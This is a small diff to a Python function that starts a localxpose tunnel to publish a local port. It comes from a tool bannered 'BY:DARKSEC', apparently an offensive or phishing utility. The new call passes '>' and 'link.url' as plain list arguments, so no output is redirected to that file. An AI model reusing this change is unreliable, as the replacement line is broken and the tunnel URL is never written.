@@ -186,7 +186,8 @@ def start_localxpose(port):
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(default_palette[1], default_palette[2]))
-        run_command('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
+        #run_command('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
+        run_command(['Server/loclx', 'tunnel', 'http', '--to', ':{0}'.format(port), '>', 'link.url'], stdout=DEVNULL, stderr=DEVNULL)
         wait(8)
         try:
             output = check_output(
